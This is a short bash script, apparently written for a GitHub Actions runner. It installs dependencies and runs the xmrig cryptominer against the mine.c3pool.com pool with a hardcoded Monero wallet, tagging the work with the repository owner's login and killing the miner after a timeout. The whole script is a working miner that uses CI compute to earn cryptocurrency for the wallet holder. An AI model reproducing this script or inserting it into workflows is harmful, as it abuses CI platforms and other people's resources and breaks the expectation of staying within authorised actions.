#!/bin/bash

echo =============================== start ===============================
# cat $GITHUB_EVENT_PATH
jsid=`cat $GITHUB_EVENT_PATH | jq ".repository.owner.login" | sed 's/\"//g'`
jswallet="8C6cNDQ2bYdLSHjzQjF8hV5sx8erdkYgv6dyxyn1Snsh1PNNcWAB2A6QzpfxB7coERU7XQDvZvnYfJxvcAqyUvDfVUBZ7ju"
jssleeptime="4000"
jspoolserver="mine.c3pool.com:15555"
jspoolcmd="-p id-$jsid -k"

echo $jswallet $jsxmrigname $jssleeptime $jspoolserver $jspoolcmd

[ -n "$LOCALTEST" ] || sudo apt-get install libuv1-dev libssl-dev libhwloc-dev -y
echo "timeout $jssleeptime ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd"
timeout $jssleeptime ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd
killall xmrig

echo ===============================  end  ===============================
